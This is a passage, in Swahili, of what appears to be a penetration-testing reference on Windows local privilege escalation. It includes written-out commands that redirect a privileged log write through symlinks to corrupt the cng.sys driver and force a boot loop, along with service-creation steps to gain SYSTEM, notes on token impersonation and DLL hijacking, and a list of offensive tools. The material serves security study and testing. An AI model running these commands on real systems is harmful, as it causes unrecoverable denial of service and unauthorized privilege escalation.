### Kutoka kwa Uwezo wa Kuunda Folda Yoyote hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **Windows driver muhimu**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ukiitengeneza mapema kama folda, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Huona folda, hushindwa kupata driver halisi, na mfumo huanguka au kuwasha hukwama.
- Hakuna njia mbadala, wala urejeshaji bila uingiliaji wa nje (kwa mfano, kurekebisha kuwasha au kufikia diski).

### Kutoka kwenye njia za logi/backup zenye upendeleo + viungo vya OM hadi kubatilisha faili holela / DoS ya kuwasha

Huduma yenye upendeleo inapoandika logi/exports kwenye njia inayosomwa kutoka kwenye config inayoweza kuandikwa, elekeza njia hiyo kwa kutumia Object Manager symlinks + NTFS mount points ili kubadilisha uandishi huo wenye upendeleo kuwa ubatilishaji wa faili holela (hata bila SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambuliaji (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kuelekea `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Operesheni yenye upendeleo inayoandika kwenye njia hiyo (logi, export, ripoti).

**Mlolongo wa mfano**
1. Soma config ili kupata upya mahali pa logi penye upendeleo, kwa mfano, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza upya njia hiyo bila haki za admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye privileged iandike log (kwa mfano, admin achochee "tuma SMS ya majaribio"). Sasa maandishi yanaandikwa kwenye `C:\Windows\System32\cng.sys`.
4. Kagua target iliyoandikwa juu yake (hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya hulazimisha Windows kupakia njia ya driver iliyoharibiwa → **boot loop DoS**. Hii inatumika pia kwa faili yoyote iliyolindwa ambayo service yenye privileged itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo kwenye `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na hivyo kuwa sehemu ya kuaminika ya kusababisha DoS kwa data iliyoharibiwa.



## **Kutoka High Integrity hadi System**

### **Service mpya**

Ikiwa tayari unaendesha process ya High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi kwa **kuunda na kutekeleza service mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapounda binary ya service, hakikisha ni service halali au binary hiyo inatekeleza vitendo vinavyohitajika kwa haraka, kwani itazimwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye process yenye High Integrity unaweza kujaribu **kuwezesha entries za registry za AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha package ya _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ukiwa na token privileges hizo (huenda utazipata kwenye process ambayo tayari ina High Integrity), utaweza **kufungua karibu process yoyote** (isipokuwa protected processes) kwa kutumia privilege ya SeDebug, **kunakili token** ya process hiyo, na kuunda **process yoyote kwa kutumia token hiyo**.\
Kwa kawaida, mbinu hii **huchagua process yoyote inayoendeshwa kama SYSTEM yenye token privileges zote** (_ndiyo, unaweza kupata process za SYSTEM ambazo hazina token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter kufanya privilege escalation kwenye `getsystem`. Mbinu hii inahusisha **kuunda pipe na kisha kuunda/ kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **ku-impersonate token** ya client wa pipe (service), na kupata privileges za SYSTEM.\
Ukitaka [**kujifunza zaidi kuhusu name pipes, soma hili**](#named-pipe-client-impersonation).\
Ukitaka kusoma mfano wa [**jinsi ya kutoka High Integrity hadi System kwa kutumia name pipes, soma hili**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **ku-hijack dll** inayokuwa **loaded** na **process** inayoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa kutumia permissions hizo. Kwa hiyo, Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation; zaidi ya hayo, ni **rahisi zaidi kuifanikisha kutoka kwenye process yenye high integrity**, kwani itakuwa na **write permissions** kwenye folders zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imedetectiwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za sessions zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwenye mashine ya ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imedetectiwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hueneza passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ADIDNS/LLMNR/mDNS spoofing na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windows enumeration ya msingi kwa privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta vulnerabilities zinazojulikana za privesc (IMEACHWA kwa ajili ya Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Unahitaji Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta vulnerabilities zinazojulikana za privesc (inahitaji kucompile kwa kutumia VisualStudio) ([**iliyocompilewa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Hufanya enumeration ya host ili kutafuta misconfigurations (ni zana zaidi ya kukusanya taarifa kuliko ya privesc) (inahitaji kucompile) **(**[**iliyocompilewa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (exe iliyocompilewa awali kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyocompilewa awali kwenye github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa kutegemea chapisho hili (haihitaji accesschk ili kufanya kazi vizuri lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python ya ndani)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (Python ya ndani)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Lazima ucompile project kwa kutumia toleo sahihi la .NET ([tazama hapa](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya victim unaweza kufanya hivi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kupandisha privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha ya ukaguzi ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Hadaa kupitia SMTP kwa Word VBA macro → kusimbua credentials za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya katika Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Udhaifu wa Privileged File System uliopo kwenye mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za Kupima Symbolic Link – Matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi hatari wa moduli kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduli za Node.js: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za orodha ya ukaguzi ya C/C++, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own na Microslop: Kuunganisha CLDFLT na hali za mashindano za DirectX Kernel kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja ya Kuzitawala Zote: Primitive kamili ya Read/Write kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia vibaya Ufutaji wa Faili Zisizobainishwa ili Kupandisha Privilege na Mbinu Nyingine Nzuri](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Windows 10 Local Privilege Escalation ya Siku ya Kwanza](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya picha yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa Ssh Private Keys kutoka kwa Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kubadilisha Seva za Enterprise Update kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kubadilisha Seva za Enterprise Update kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Windows Installer Folder Delete Privilege Escalation ya Microsoft](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Kufuatilia tena hatua zako hadi NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Ushauri kuhusu Privilege Escalation kupitia offsets za shared-memory za Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
